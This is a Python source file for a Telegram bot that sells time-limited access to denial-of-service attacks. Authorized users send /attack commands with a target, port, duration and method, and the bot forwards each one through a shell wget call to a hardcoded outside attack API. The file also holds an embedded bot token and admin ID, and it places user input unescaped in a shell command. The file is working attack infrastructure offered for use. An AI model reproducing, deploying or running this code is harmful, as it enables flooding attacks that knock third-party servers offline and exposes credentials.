import telepot
from telepot.loop import MessageLoop
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import subprocess
from threading import Timer
import threading
import urllib.parse
import datetime
import time
import os
import ipaddress

TOKEN = '6171307436:AAHLyEQ0s7rGwz_ac5th0LHwhBLfXE0DRi4'

MAX_SLOTS = 1
running_slots = 0
running_attacks = []

blacklist = ['1.1.1.1', '127.0.0.1', 'hungvps.com']

def read_authorized_users():
    try:
        with open('users.txt', 'r') as f:
            lines = f.readlines()
            authorized_users = {}
            for line in lines:
                if line.strip():
                    user_id, expiry_date_str, max_duration_str, max_concurrents_str = line.strip().split(':')
                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
                    max_duration = int(max_duration_str)
                    max_concurrents = int(max_concurrents_str)
                    authorized_users[int(user_id)] = {
                        'expiry_date': expiry_date,
                        'max_duration': max_duration,
                        'max_concurrents': max_concurrents
                    }
            return authorized_users
    except FileNotFoundError:
        return {}

def write_authorized_users(authorized_users):
    try:
        with open('users.txt', 'w') as f:
            for user_id, info in authorized_users.items():
                expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
                max_duration_str = str(info['max_duration'])
                max_concurrents_str = str(info['max_concurrents'])
                f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}:{max_concurrents_str}\n")
    except Exception as e:
        print(f"An error occurred while writing authorized users: {e}")

def is_user_authorized(user_id):
    global authorized_users
    if user_id not in authorized_users:
        return False
    info = authorized_users[user_id]
    if info['expiry_date'] < datetime.datetime.now():
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        bot.sendMessage(user_id, 'Key has expired. Please use /key for enter key new.')
        return False
    return True

def add_admin_user(*user_ids):
    global admin_users
    admin_users.update(user_ids)

def remove_admin_user(user_id):
    global admin_users
    if user_id in admin_users:
        admin_users.remove(user_id)

def handle_message(msg):
    global authorized_users
    global admin_users
    content_type, chat_type, chat_id = telepot.glance(msg)
    user_id = msg['from']['id']

    if content_type == 'text' and msg['text'].startswith('/key'):
        args = msg['text'].split()[1:]  # fixed
        if len(args) != 1:
            bot.sendMessage(chat_id, 'Usage: /key [KEY].\nGet key: https://1.1.1.1', reply_to_message_id=msg['message_id'])
            return
        key = args[0]
        handle_key_command(chat_id, key, msg)
        return

    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, 'Key has expired. Please use /key for enter key new.')
        return

    if user_id not in admin_users:
        if content_type == 'text' and (msg['text'].startswith('/adduser') or msg['text'].startswith('/removeuser') or msg['text'].startswith('/updateuser') or msg['text'].startswith('/userlist') or msg['text'].startswith('/admin')):
            bot.sendMessage(chat_id, 'Only admin can using commands.')
            return

    if content_type == 'text':
        command = msg['text']
        if command == '/start':
            bot.sendMessage(chat_id, 'Welcome, use /help for show all commands.', reply_to_message_id=msg['message_id'])
            return
        elif command == '/help':
            bot.sendMessage(chat_id, '/help - Show all commands.\n/methods - Show method lists.\n/attack - Start attacking.\n/running - Show running attacks.', reply_to_message_id=msg['message_id'])
            return
        elif command == '/admin':
            bot.sendMessage(chat_id, '/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user.\n/userlist - Show user lists.', reply_to_message_id=msg['message_id'])
            return
        elif command == '/running':
            if not running_attacks:
                bot.sendMessage(chat_id, 'No running attacks.', reply_to_message_id=msg['message_id'])
                return
            message = 'Running attacks:\n'
            for attack in running_attacks:
                message += f'⌛Target: {attack["target"]}\n⌛Port: {attack["port"]}\n⌛Duration: {attack["duration"]}\n⌛Slots: {running_slots}/{MAX_SLOTS}\n'
            bot.sendMessage(chat_id, message, reply_to_message_id=msg['message_id'])
        elif command == '/methods':
            bot.sendMessage(chat_id, 'TCP - TCP Flood For Bypassing.\nUDP - UDP Flood With Big Worker.', reply_to_message_id=msg['message_id'])
            return
        elif command.startswith('/attack'):
            info = authorized_users[user_id]
            max_concurrents = info['max_concurrents']
            if running_slots >= MAX_SLOTS:
                bot.sendMessage(chat_id, 'Slots using 1/1, please wait.', reply_to_message_id=msg['message_id'])
                return
            if running_slots >= max_concurrents:
                bot.sendMessage(chat_id, f'Your max concurrents is {max_concurrents}, please wait your attack finished.', reply_to_message_id=msg['message_id'])
                return
            args = command.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Usage: /attack <target> <port> <duration> <method>.', reply_to_message_id=msg['message_id'])
                return
            target, port, duration, method = args
            duration = int(duration)
            valid_methods = ['TLS', 'BYPASS']
            max_duration = info['max_duration']
            if duration > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds.'.format(max_duration))
                return
            if method == 'TLS':
                valid_duration = max_duration
                command = f'wget -qO- http://45.93.200.142:999/api/attack?host={target}&port={port}&time={valid_duration}&method=TLS&key=tcpsynn'
                if duration > max_duration:
                    bot.sendMessage(chat_id, f'Max max attack duration is {max_duration}.', reply_to_message_id=msg['message_id'])
                    return
            elif method == 'BYPASS':
                valid_duration = max_duration
                command = f'wget -qO- http://45.93.200.142:999/api/attack?host={target}&port={port}&time={valid_duration}&method=BYPASS&key=tcpsynn'
                if duration > max_duration:
                    bot.sendMessage(chat_id, f'Max max attack duration is {max_duration}.', reply_to_message_id=msg['message_id'])
                    return
            else:
                bot.sendMessage(chat_id, 'Invalid method.', reply_to_message_id=msg['message_id'])
                return
            try:
                ip = ipaddress.IPv4Address(target)
                if str(ip) in blacklist:
                    bot.sendMessage(chat_id, 'Target IP is blacklisted.', reply_to_message_id=msg['message_id'])
                    return
            except ipaddress.AddressValueError:
                # Removed the invalid IP address function
                pass
            try:
                print(command)
                output = subprocess.check_output(command, shell=True)
                keyboard = InlineKeyboardMarkup(inline_keyboard=[[
                    InlineKeyboardButton(text='PING', url=f'https://check-host.net/check-ping?host={urllib.parse.quote(target)}'),
                    InlineKeyboardButton(text='TCPPING', url=f'https://check-host.net/check-tcp?host={urllib.parse.quote(target)}:{urllib.parse.quote(port)}'),
                    InlineKeyboardButton(text='HTTP', url=f'https://check-host.net/check-http?host={urllib.parse.quote(target)}:{urllib.parse.quote(port)}')
                ]])
                bot.sendMessage(chat_id, f'🚀ATTACK SENT🚀\n💣Target: {target}\n💣Port: {port}\n💣Duration: {duration}\n💣Method: {method}', reply_to_message_id=msg['message_id'], reply_markup=keyboard)
                attack = {"target": target, "port": port, "duration": duration}
                running_attacks.append(attack)
                increase_slots()
            except subprocess.CalledProcessError as e:
                bot.sendMessage(chat_id, 'Attack error.', reply_to_message_id=msg['message_id'])
            finally:
                Timer(duration, decrease_slots).start()
        elif command.startswith('/adduser'):
            args = command.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /adduser [id] [expiry date] [max attack times] [max concurrents]')
            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            max_concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            authorized_users[target_user_id] = {'expiry_date': expiry_date, 'max_duration': max_duration, 'max_concurrents': max_concurrents}
            write_authorized_users(authorized_users)
            bot.sendMessage(chat_id, 'Added {} to access list with expiry date {}, maximum duration {} seconds and max concurrents is {}.'.format(target_user_id, expiry_date_str, max_duration, max_concurrents))
        elif command.startswith('/removeuser'):
            bot.sendMessage(chat_id, 'Using: /removeuser [id]')
            user_id = int(command.split()[1])
            if user_id in authorized_users:
                del authorized_users[user_id]
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Removed {} from the access list.'.format(user_id))
            else:
                bot.sendMessage(chat_id, 'User {} not in the access list.'.format(user_id))
        elif command.startswith('/updateuser'):
            args = command.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /updateuser [id] [expiry date] [max attack times] [max concurrents]')
            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            max_concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            if target_user_id in authorized_users:
                authorized_users[target_user_id]['expiry_date'] = expiry_date
                authorized_users[target_user_id]['max_duration'] = max_duration
                authorized_users[target_user_id]['max_concurrents'] = max_concurrents
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Updated user {} with expiry date {}, maximum duration {} seconds and max concurrents is {}.'.format(target_user_id, expiry_date_str, max_duration, max_concurrents))
            else:
                bot.sendMessage(chat_id, 'User {} is not in the access list.'.format(target_user_id))
        elif command == '/userlist':
            handle_userlist_command(chat_id)

def handle_userlist_command(chat_id):
    global authorized_users
    userlist = ''
    for user_id, info in authorized_users.items():
        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
        max_duration_str = str(info['max_duration'])
        max_concurrents_str = str(info['max_concurrents'])
        userlist += f'User ID: {user_id}\nExpiry Date: {expiry_date_str}\nMax Duration: {max_duration_str}\nMax Concurrents: {max_concurrents_str}\n\n'
    bot.sendMessage(chat_id, userlist)

def check_expired_users():
    global authorized_users
    now = datetime.datetime.now()
    for user_id, user_info in list(authorized_users.items()):
        expiry_date = user_info['expiry_date']
        if expiry_date < now:
            del authorized_users[user_id]
            write_authorized_users(authorized_users)
            bot.sendMessage(user_id, 'Key has expired. Please use /key for enter key new.')
            break  # fixed
    threading.Timer(86400, check_expired_users).start()

def increase_slots():
    global running_slots
    running_slots += 1

def decrease_slots():
    global running_slots, running_attacks
    running_slots -= 1
    if running_attacks:
        running_attacks.pop(0)

def handle_key_command(chat_id, key, msg):
    global authorized_users
    if key == 'DEMOKEY':
        now = datetime.datetime.now()
        next_day = now + datetime.timedelta(days=1)
        expiry_date_str = next_day.strftime('%Y-%m-%d')
        user_id = chat_id
        authorized_users[user_id] = {
            'expiry_date': next_day,
            'max_duration': 60,
            'max_concurrents': 1
        }
        write_authorized_users(authorized_users)
        bot.sendMessage(chat_id, f'Key is correct. Expired on {expiry_date_str}.', reply_to_message_id=msg['message_id'])
    else:
        bot.sendMessage(chat_id, 'Invalid key.', reply_to_message_id=msg['message_id'])

if __name__ == '__main__':
    bot = telepot.Bot(TOKEN)
    authorized_users = read_authorized_users()
    admin_users = set()
    add_admin_user(1267510767)
    MessageLoop(bot, handle_message).run_as_thread()

    print('Bot running...')
    check_expired_users()
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            print('\nBot stopped.')
            break